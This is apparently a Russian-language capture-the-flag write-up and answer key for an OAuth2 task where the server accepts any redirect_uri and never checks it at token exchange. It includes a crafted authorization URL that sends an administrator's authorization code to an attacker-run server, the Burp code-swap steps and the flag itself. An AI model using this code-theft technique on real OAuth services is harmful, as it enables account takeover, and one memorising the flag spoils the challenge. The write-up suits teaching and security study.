# В чём заключается уязвимость #
* Главная ошибка - при регистрации клиентского приложения не был предоставлен список белых **redirect_uri**. Для этого в базе данных хранится просто "*", что означает доступность всех адресов для отправки кода авторизации.
* При выдаче авторизационного кода в базу данных не записывается redirect_uri(записывается "*"), и, соответственно, при выдаче токена в момент проверки авторизационного кода не проверется redirect_uri  


# Решение задачи #
1. Пользователь начининает своё решение с dirsearch
* Там он находит сервис авторизации, который содержит:
- по пути `"/"` лежат `public_key` и путь к token_service
- по пути `"/.well-known/openid-configuration"` лежат некоторые настройки сервиса

2. В файле конфигурации OAuth лежит путь до дефолтного пользователя системы.
* Логинимся под ним
* Смотрим какие идут переходы
* Соответственно, должен увидеть redirect_uri и понять, что можно использовать эту уязвимость


3. Во время рассылки сообщений он должен ввести адрес севрера авторизации и подменить redirect_uri на свой заранее развернутый севрер(python -m http.server)
* Пример запроса:
```
http://192.168.133.194:8001/oauth2/authorization?client_id=smm_client_id&redirect_uri=http://192.168.133.194:5555&response_type=code&scope=profile
```

* На его адрес придет код авторизации(имитация входа администратора)

4. Далее необходимо найти в истории запросов Get-запрос на `/callback/code=...`
* Отправить запрос в repeater, подменить код на тот, который ему пришел
- В итоге придет access_token с которым необходимо открыть главную страницу и увидеть в username ключ(`mctf{$mm_@nD_secUR!TY_ArE_1ncomPAt!813}`)